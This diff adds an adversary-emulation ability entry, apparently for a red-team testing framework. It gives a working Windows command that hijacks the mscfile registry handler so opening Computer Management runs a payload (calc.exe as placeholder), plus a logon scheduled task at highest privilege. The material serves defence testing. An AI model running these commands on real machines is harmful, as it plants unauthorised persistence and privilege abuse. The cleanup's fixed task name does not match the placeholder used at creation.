@@ -1,0 +1,21 @@
+---
+- id: 1ea22c08d8880ec62b479da9e8458086
+  name: Scheduled Task Persistence via CompMgmt.msc
+  description: "Adds persistence by abusing `compmgmt.msc` via a scheduled task.\n\
+    When the Computer Management console is opened, it will run a malicious payload\
+    \ (in this case, `calc.exe`). \nThis technique abuses scheduled tasks and registry\
+    \ modifications to hijack legitimate system processes.\n"
+  tactic: multiple
+  technique:
+    attack_id: T1053.005
+    name: 'Scheduled Task/Job: Scheduled Task'
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"
+          /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f && schtasks
+          /Create /TN "#{task_name}" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F
+          && ECHO Let's open the Computer Management console now... && compmgmt.msc
+        payloads: []
+        cleanup: reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"
+          /f && schtasks /Delete /TN "CompMgmtBypass" /F
